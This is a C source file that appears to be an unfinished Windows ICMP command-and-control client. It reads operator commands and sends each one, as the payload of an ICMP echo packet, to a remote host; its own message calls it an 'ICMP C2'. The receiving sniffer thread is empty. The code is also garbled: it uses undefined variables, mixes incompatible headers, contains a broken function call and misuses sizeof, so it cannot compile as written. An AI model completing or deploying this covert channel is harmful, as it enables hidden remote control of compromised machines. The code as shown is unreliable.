#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <ws2tcpip.h>

#define ICMP_ID 13170
#define PACKET_LENGTH 4096 // Unsure

struct sockaddr_in dest_addr;
struct sockaddr_in source_addr;

struct icmp_hdr {
    uint8_t type;
    uint8_t code;
    uint16_t checksum;
    uint16_t id;
    uint16_t seq;
};

/*
struct ip_hdr {
    unsigned int version;
    unsigned int ihl;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_offset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint32_t saddr;
    uint32_t daddr;
};
*/

unsigned short icmp_checksum(unsigned short *addr, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    /* 
     * The checksum is the 16-bit ones's complement of the one's
     * complement sum of the ICMP message starting with the ICMP Type.
     * For computing the checksum , the checksum field should be zero. 
     */

    while(nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if( nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

int frame_icmp_echo_header(int pack_no)
{
    int packsize;
    struct icmp *icmp;
    struct timeval *tval;

    /* ICMP Header structure */
    icmp = (struct icmp*)sendpacket;
    /* ICMP echo TYPE */
    icmp->type = ICMP_ECHO;   // 8 : Echo Request
    icmp->code = 0;  // 0 = net unreachable
    icmp->checksum = 0;
    icmp->id = pid;
    icmp->seq = pack_no;
    packsize = 8 + ICMP_DATA_LEN;  // 8 + 56 (data) = 64 Bytes ICMP header
    tval = (struct timeval *)icmp -> icmp_data;
    gettimeofday(tval, NULL);
    /* Calculate checksum */ 
    icmp->icmp_cksum = icmp_checksum( (unsigned short *)icmp, packsize);
    return packsize;
}

void send_icmp_echo_packet()
{
    int packetsize;

    nsend++;
    /* ICMP EHCO PACKET HEADER */
    packetsize = frame_icmp_echo_header(nsend);

    /* Send the ICMP packet to the destination Address */
    if( sendto(sockfd, sendpacket, packetsize, 0,
                (struct sockaddr *)&dest_addr, sizeof(dest_addr) ) < 0  ) {
        perror("sendto error");
        nsend--;
    }
    sleep(1);
}


 \
bool send_icmp_packet(int socket, char *icmp_shell, int packet_seq) {
    /*
    size_t packet_size = sizeof(struct ip_hdr) + sizeof(struct icmp_hdr) + sizeof(payload);
    char *packet = malloc(packet_size);
    struct ip_hdr *ip = (struct ip_hdr*) packet;
    struct icmp_hdr *icmp = (struct imcp_hdr*) (packet + sizeof(struct ip_hdr)); 
    char *payload = (char *) (packet + sizeof(struct ip_hdr) + sizeof(struct icmp_hdr));

    ip->ihl      = 5;
    ip->version  = 4;
    ip->tos      = 16;
    ip->tot_len  = packet_size;
    ip->id       = htons(54321);
    ip->ttl      = 64; 
    ip->protocol = 1; // UDP
    ip->frag_offset = 0; // Handled automatically
    ip->checksum;
    ip->saddr;
    ip->daddr;
    */

    char *packet = malloc(sizeof(struct icmp_hdr*) + sizeof(icmp_shell));
    struct icmp_hdr *icmp = (struct imcp_hdr*) (packet); 
    char *payload = (char *) (packet + sizeof(struct icmp_hdr));

    icmp->type = 8;
    icmp->code = 0;
    icmp->checksum; // TBD 
    icmp->seq = packet_seq;
    icmp->id = ICMP_ID;

    strcpy(payload, icmp_shell);

    if( sendto(socket, packet, sizeof(struct icmp_hdr*) + sizeof(icmp_shell), 0,
                (struct sockaddr *)&dest_addr, sizeof(dest_addr) ) < 0  ) {
        perror("Sendto error");
        return false;
    }
    sleep(1);
    return true;
}


DWORD WINAPI IcmpSniffer(LPVOID lpParam) {

}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    HANDLE hThread = CreateThread(NULL, 0, IcmpSniffer, NULL, 0, NULL);

    char icmp_shell[100];
    char exit_string = "exit";
    int packet_seq = 0;
    while (true) {
        fgets(icmp_shell, sizeof(icmp_shell), stdin);
        if (strcmp(icmp_shell, exit_string) == 0) {
            printf("[+]Stopping ICMP C2...");
            WaitForSingleObject(hThread, 1);
            CloseHandle(hThread);
        } else if (strcmp(icmp_shell, "") == 0) {
            continue;
        } else {
            if (send_icmp_packet(icmp_shell,)) {
                packet_seq++;
            }
            // Send ICMP packet as payload
        }
    }
}












